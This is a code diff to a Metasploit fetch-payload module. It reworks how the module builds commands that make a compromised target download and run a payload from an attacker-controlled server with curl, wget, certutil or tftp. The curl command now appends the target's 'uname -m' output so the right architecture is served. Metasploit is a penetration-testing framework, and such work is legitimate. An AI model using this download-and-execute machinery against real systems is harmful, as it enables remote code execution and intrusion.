@@ -112,44 +112,30 @@ module Msf
 
     def generate(opts = {})
       opts[:arch] ||= module_info['AdaptedArch']
+      @payload_opts = opts[:arch]
+      dynamic_arch = false
       if opts[:arch] == ARCH_ANY && module_info['AdaptedPlatform'] == 'linux'
-        # create a hash with all the arches and payloads
-        multi_arches.each do |arch|
-          opts[:arch] = arch
-          @multi_arch = arch # needed for payload_uuid creation
-          vprint_status("Generating payload for #{arch}")
-          opts[:code] = super(opts)
-          # no FETCH_URIPATH support for multi payloads
-          add_srv_entry(default_srvuri(arch.to_s), generate_payload_exe(opts), arch)
-        end
-        cmd = _generate_multi_commands(@srv_resources)
-        # print_status("multi command:\n#{cmd}")
-        if datastore['FETCH_PIPE']
-          unless pipe_supported_binaries.include?(datastore['FETCH_COMMAND'].upcase)
-            fail_with(Msf::Module::Failure::BadConfig, "Unsupported binary selected for FETCH_PIPE option: #{datastore['FETCH_COMMAND']}, must be one of #{pipe_supported_binaries}.")
-          end
-          add_srv_entry(pipe_srvuri, cmd)
-          cmd = generate_pipe_command(pipe_srvuri)
-          print_status("Pipe command: #{cmd}")
-        end
+        dynamic_arch = true
+        add_srv_entry(srvuri, 'x', opts)
       else
-        opts[:code] = super
-        add_srv_entry(srvuri, generate_payload_exe(opts), opts[:arch])
-        cmd = generate_fetch_commands(srvuri)
-        if datastore['FETCH_PIPE']
-          unless pipe_supported_binaries.include?(datastore['FETCH_COMMAND'].upcase)
-            fail_with(Msf::Module::Failure::BadConfig, "Unsupported binary selected for FETCH_PIPE option: #{datastore['FETCH_COMMAND']}, must be one of #{pipe_supported_binaries}.")
-          end
-          cmd << '\n' if windows? # Needs CR for Windows command
-          add_srv_entry(pipe_srvuri, cmd)
-          cmd = generate_pipe_command(pipe_srvuri)
+        dynamic_arch = false
+        add_srv_entry(srvuri, generate_payload_exe(opts), opts)
+      end
+
+      cmd = generate_fetch_commands(srvuri, dynamic_arch)
+      if datastore['FETCH_PIPE']
+        unless pipe_supported_binaries.include?(datastore['FETCH_COMMAND'].upcase)
+          fail_with(Msf::Module::Failure::BadConfig, "Unsupported binary selected for FETCH_PIPE option: #{datastore['FETCH_COMMAND']}, must be one of #{pipe_supported_binaries}.")
         end
+        cmd << '\n' if windows? # Needs CR for Windows command
+        add_srv_entry(pipe_srvuri, cmd)
+        cmd = generate_pipe_command(pipe_srvuri)
       end
       vprint_status("Command to execute on target: #{cmd}")
       cmd
     end
 
-    def generate_fetch_commands(uri)
+    def generate_fetch_commands(uri, dynamic_arch)
       # TODO: Make a check method that determines if we support a platform/server/command combination
       #
       case datastore['FETCH_COMMAND'].upcase
@@ -158,9 +144,9 @@ module Msf
       when 'TNFTP'
         return _generate_tnftp_command(uri)
       when 'WGET'
-        return _generate_wget_command(uri)
+        return _generate_wget_command(uri, dynamic_arch)
       when 'CURL'
-        return _generate_curl_command(uri)
+        return _generate_curl_command(uri, dynamic_arch)
       when 'TFTP'
         return _generate_tftp_command(uri)
       when 'CERTUTIL'
@@ -300,10 +286,10 @@ module Msf
       _execute_add(get_file_cmd)
     end
 
-    def _generate_curl_command(uri)
+    def _generate_curl_command(uri, dynamic_arch)
       case fetch_protocol
       when 'HTTP'
-        get_file_cmd = "curl -so #{_remote_destination} http://#{download_uri(uri)}"
+        get_file_cmd = "curl -so #{_remote_destination} http://#{download_uri(uri)}?arch=$(uname -m)"
       when 'HTTPS'
         get_file_cmd = "curl -sko #{_remote_destination} https://#{download_uri(uri)}"
       when 'TFTP'
